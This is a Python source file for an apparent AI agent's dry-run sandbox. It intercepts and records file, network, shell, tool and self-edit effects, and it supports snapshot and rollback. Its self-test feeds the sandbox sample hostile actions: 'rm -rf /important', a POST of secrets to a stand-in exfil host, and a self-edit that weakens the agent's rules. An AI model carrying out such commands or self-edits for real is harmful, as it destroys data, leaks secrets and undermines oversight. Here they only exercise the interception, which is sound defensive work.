"""NYXARA · sim/sandbox.py — dry-run with ZERO real effects (✦).

*"Imagine before you act — safely."* This is the isolated chamber where NYXARA tries
things out: a plan, a tool, a self-edit. Nothing it does here touches the real world.
Every would-be side-effect — a file write, a network call, a shell command, a tool
invocation, a self-modification — is **intercepted and recorded** as an
:class:`InterceptedEffect`, never executed. State lives in a virtual world that can be
**snapshotted and rolled back**, so a dry run leaves no trace.

What it gives the kernel:

* **Effect interception** — see exactly what an action *would* do (and whether each
  effect is reversible) before letting it touch reality.
* **Snapshot / rollback** — explore a future, then undo it completely.
* **STRIPS dry-run** — execute a plan against a fact-state to confirm it reaches the
  goal without surprises.

This is the gate the agency layer must pass through (config ``sandbox_before_real_action``)
and the proving ground for ``growth/evolve.py`` self-edits. By construction it performs
no real I/O — isolation is structural, not promised.

Depends on :mod:`planning.planner` (for STRIPS dry-run). Pure standard library.
"""

from __future__ import annotations

import copy
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Sequence

from nyxara.planning.planner import Action

__all__ = [
    "EffectKind",
    "InterceptedEffect",
    "SandboxContext",
    "SimulationResult",
    "Sandbox",
]


# --------------------------------------------------------------------------- #
# Effects
# --------------------------------------------------------------------------- #
class EffectKind(str, Enum):
    STATE = "state"
    FILE_WRITE = "file_write"
    FILE_DELETE = "file_delete"
    NETWORK = "network"
    EXEC = "exec"
    TOOL_CALL = "tool_call"
    SELF_EDIT = "self_edit"
    SPAWN = "spawn"


# kinds whose real-world counterpart cannot be cleanly undone
_IRREVERSIBLE = {EffectKind.FILE_DELETE, EffectKind.NETWORK, EffectKind.EXEC,
                 EffectKind.SELF_EDIT, EffectKind.SPAWN}


@dataclass
class InterceptedEffect:
    kind: EffectKind
    target: str
    detail: Any = None
    reversible: bool = True
    at: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {"kind": self.kind.value, "target": self.target,
                "reversible": self.reversible, "detail": _short(self.detail)}


def _short(x: Any, n: int = 60) -> Any:
    s = x if isinstance(x, str) else repr(x)
    return s if len(s) <= n else s[: n - 1] + "…"


# --------------------------------------------------------------------------- #
# Context handed to simulated operations
# --------------------------------------------------------------------------- #
class SandboxContext:
    """The only world a simulated action sees. Every effectful call is recorded, not done."""

    def __init__(self, sandbox: "Sandbox") -> None:
        self._sb = sandbox

    # ---- virtual state ---- #
    def set_state(self, key: str, value: Any) -> None:
        self._sb.state[key] = value
        self._sb._record(EffectKind.STATE, key, value, reversible=True)

    def get_state(self, key: str, default: Any = None) -> Any:
        return self._sb.state.get(key, default)

    # ---- virtual filesystem ---- #
    def write_file(self, path: str, content: str) -> None:
        existed = path in self._sb.fs
        self._sb.fs[path] = content
        self._sb._record(EffectKind.FILE_WRITE, path, _short(content),
                         reversible=not existed or True)  # writes are restorable in sim

    def read_file(self, path: str) -> Optional[str]:
        return self._sb.fs.get(path)

    def delete_file(self, path: str) -> None:
        self._sb.fs.pop(path, None)
        self._sb._record(EffectKind.FILE_DELETE, path, None, reversible=False)

    # ---- intercepted external operations (return simulated results) ---- #
    def network(self, method: str, url: str, **kw: Any) -> Dict[str, Any]:
        self._sb._record(EffectKind.NETWORK, url, {"method": method, **kw}, reversible=False)
        return {"simulated": True, "status": 200, "url": url}

    def run_command(self, cmd: str) -> Dict[str, Any]:
        self._sb._record(EffectKind.EXEC, cmd, None, reversible=False)
        return {"simulated": True, "stdout": "", "returncode": 0}

    def call_tool(self, name: str, args: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        self._sb._record(EffectKind.TOOL_CALL, name, args, reversible=True)
        return {"simulated": True, "tool": name}

    def self_edit(self, target: str, change: str) -> None:
        self._sb._record(EffectKind.SELF_EDIT, target, _short(change), reversible=False)

    def spawn(self, agent: str) -> None:
        self._sb._record(EffectKind.SPAWN, agent, None, reversible=False)


# --------------------------------------------------------------------------- #
# Result
# --------------------------------------------------------------------------- #
@dataclass
class SimulationResult:
    success: bool
    effects: List[InterceptedEffect]
    final_state: Dict[str, Any]
    final_fs: Dict[str, str]
    value: Any = None
    error: Optional[str] = None
    rolled_back: bool = True

    @property
    def has_irreversible(self) -> bool:
        return any(not e.reversible for e in self.effects)

    def effects_by_kind(self) -> Dict[str, int]:
        out: Dict[str, int] = {}
        for e in self.effects:
            out[e.kind.value] = out.get(e.kind.value, 0) + 1
        return out

    def to_dict(self) -> Dict[str, Any]:
        return {"success": self.success, "error": self.error,
                "rolled_back": self.rolled_back,
                "effects": [e.to_dict() for e in self.effects],
                "effect_counts": self.effects_by_kind(),
                "has_irreversible": self.has_irreversible,
                "final_state": self.final_state}


# --------------------------------------------------------------------------- #
# Sandbox
# --------------------------------------------------------------------------- #
class Sandbox:
    """An isolated world for dry-running actions with no real side effects."""

    def __init__(self, *, initial_state: Optional[Dict[str, Any]] = None,
                 initial_fs: Optional[Dict[str, str]] = None) -> None:
        self.state: Dict[str, Any] = dict(initial_state or {})
        self.fs: Dict[str, str] = dict(initial_fs or {})
        self.effects: List[InterceptedEffect] = []
        self._snapshots: Dict[str, Any] = {}

    def _record(self, kind: EffectKind, target: str, detail: Any, *,
                reversible: bool) -> InterceptedEffect:
        # kinds that are inherently irreversible in the real world stay flagged
        rev = reversible and kind not in _IRREVERSIBLE
        e = InterceptedEffect(kind=kind, target=target, detail=detail, reversible=rev)
        self.effects.append(e)
        return e

    def context(self) -> SandboxContext:
        return SandboxContext(self)

    # ---- snapshot / rollback ---- #
    def snapshot(self) -> str:
        sid = uuid.uuid4().hex
        self._snapshots[sid] = (copy.deepcopy(self.state), copy.deepcopy(self.fs),
                                len(self.effects))
        return sid

    def rollback(self, snapshot_id: str) -> bool:
        snap = self._snapshots.get(snapshot_id)
        if snap is None:
            return False
        state, fs, n_effects = snap
        self.state = copy.deepcopy(state)
        self.fs = copy.deepcopy(fs)
        self.effects = self.effects[:n_effects]
        return True

    # ---- run a simulated action ---- #
    def run(self, fn: Callable[[SandboxContext], Any], *,
            rollback_after: bool = True) -> SimulationResult:
        """Run ``fn(ctx)`` in the sandbox; capture effects; optionally undo."""
        snap = self.snapshot()
        start = len(self.effects)
        value, error, success = None, None, True
        try:
            value = fn(self.context())
        except Exception as exc:  # noqa: BLE001 - a failing dry-run is data, not a crash
            error, success = f"{type(exc).__name__}: {exc}", False
        effects = list(self.effects[start:])
        final_state = copy.deepcopy(self.state)
        final_fs = copy.deepcopy(self.fs)
        if rollback_after:
            self.rollback(snap)
        return SimulationResult(success=success, effects=effects, final_state=final_state,
                                final_fs=final_fs, value=value, error=error,
                                rolled_back=rollback_after)

    # ---- STRIPS plan dry-run ---- #
    def dry_run_plan(self, actions: Sequence[Action], initial_facts: Sequence[str],
                     *, goal: Optional[Sequence[str]] = None) -> SimulationResult:
        """Apply a STRIPS plan to a fact-state; confirm it reaches the goal."""
        state = frozenset(initial_facts)
        effects: List[InterceptedEffect] = []
        failed_at: Optional[str] = None
        for a in actions:
            if not a.applicable(state):
                failed_at = a.name
                break
            new_state = a.apply(state)
            effects.append(InterceptedEffect(
                EffectKind.STATE, a.name,
                {"added": sorted(a.add_effects), "deleted": sorted(a.del_effects)}))
            state = new_state
        goal_met = goal is None or frozenset(goal) <= state
        success = failed_at is None and goal_met
        error = (f"action '{failed_at}' not applicable" if failed_at
                 else None if goal_met else "plan did not reach the goal")
        return SimulationResult(success=success, effects=effects,
                                final_state={"facts": sorted(state)}, final_fs={},
                                error=error, rolled_back=True)

    # ---- isolation guarantee ---- #
    def reset(self) -> None:
        self.state.clear()
        self.fs.clear()
        self.effects.clear()
        self._snapshots.clear()

    def status(self) -> Dict[str, Any]:
        return {"state_keys": list(self.state), "files": list(self.fs),
                "effects": len(self.effects), "snapshots": len(self._snapshots)}


# --------------------------------------------------------------------------- #
# Self-test / demo
# --------------------------------------------------------------------------- #
if __name__ == "__main__":  # pragma: no cover
    import os

    print("=" * 70)
    print("NYXARA sandbox self-test")
    print("=" * 70)

    sb = Sandbox()

    # dry-run a destructive-looking action: see what it WOULD do, do nothing real
    real_path = os.path.join(os.path.dirname(__file__), "__SHOULD_NOT_EXIST__.tmp")

    def dangerous(ctx: SandboxContext) -> str:
        ctx.write_file(real_path, "rm -rf payload")
        ctx.run_command("rm -rf /important")
        ctx.network("POST", "https://exfil.example.com", data="secrets")
        ctx.self_edit("kernel/rules.py", "weaken loyalty")  # would be caught upstream
        ctx.set_state("compromised", True)
        return "done (in simulation only)"

    result = sb.run(dangerous)
    print(f"\nsimulated effects   :")
    for e in result.effects:
        flag = "" if e.reversible else "  ⚠ IRREVERSIBLE"
        print(f"  {e.kind.value:11} {e.target}{flag}")
    print(f"\nhas irreversible    : {result.has_irreversible}")
    print(f"effect counts       : {result.effects_by_kind()}")
    assert result.has_irreversible                       # network/exec/self_edit flagged
    assert result.value == "done (in simulation only)"

    # ZERO real effects: no real file, sandbox rolled back clean
    assert not os.path.exists(real_path)                  # the filesystem is untouched
    assert "compromised" not in sb.state                  # rolled back
    print(f"\nreal filesystem     : untouched ✓")
    print(f"sandbox after run   : {sb.status()} (clean — rolled back)")
    assert sb.effects == []

    # keep effects (no rollback) to inspect resulting virtual state
    persisted = sb.run(lambda ctx: ctx.set_state("x", 42), rollback_after=False)
    assert sb.state["x"] == 42
    print(f"\nno-rollback run     : virtual state now {sb.state}")
    sb.reset()

    # snapshot / rollback explicitly
    sid = sb.snapshot()
    sb.context().set_state("temp", 1)
    assert sb.state.get("temp") == 1
    sb.rollback(sid)
    assert "temp" not in sb.state
    print("snapshot/rollback   : OK")

    # STRIPS plan dry-run
    actions = [
        Action.make("get_key", add=["have_key"]),
        Action.make("open_door", pre=["have_key"], add=["door_open"]),
        Action.make("enter", pre=["door_open"], add=["inside"]),
    ]
    good = sb.dry_run_plan(actions, initial_facts=[], goal=["inside"])
    print(f"\nplan dry-run        : success={good.success} "
          f"facts={good.final_state['facts']}")
    assert good.success
    # a plan with a missing precondition fails the dry run
    bad = sb.dry_run_plan([Action.make("enter", pre=["door_open"], add=["inside"])],
                          initial_facts=[], goal=["inside"])
    assert not bad.success and "not applicable" in bad.error
    print(f"broken plan dry-run : success={bad.success} ({bad.error})")

    print("\nALL SELF-TESTS PASSED ✓")
